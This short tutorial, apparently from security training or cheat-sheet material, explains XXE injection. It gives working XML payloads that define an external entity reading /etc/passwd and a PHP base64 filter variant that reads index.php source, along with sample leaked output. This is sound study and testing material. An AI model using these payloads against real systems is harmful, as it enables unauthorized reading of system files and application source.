To perform an XXE Injection Attack to retrieve sensitive system files, an attacker needs to modify the submitted XML in two ways:
1. Introduce or edit a `DOCTYPE` element that defines an external entity containing the path of the file.
2. Edit a value in the XML that is returned in the application's HTTP response, to make sure of the defined external entity.

For example, an application checks the stock level of a product by submitting the following XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```
An attacker can exploit the XXE vulnerability by modifying the XML to include the XXE payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE haxxor [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
The XXE payload defines the `&xxe;` in the `DOCTYPE` and uses the entity within the `productId` tag to return the value. This causes the application's response to include the contents of the file:
```txt
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

Additionally, if the target is a PHP application, we can use wrapper filters to encode the content using Base64. For example:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE haxxor [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
## Note
With real-world XXE vulnerabilities, there will often be a large number of data values within the submitted XML, any one of which might be used within the application's response. To test systematically for XXE vulnerabilities, you will generally need to test each data node in the XML individually, by making use of your defined entity and seeing whether it appears within the response.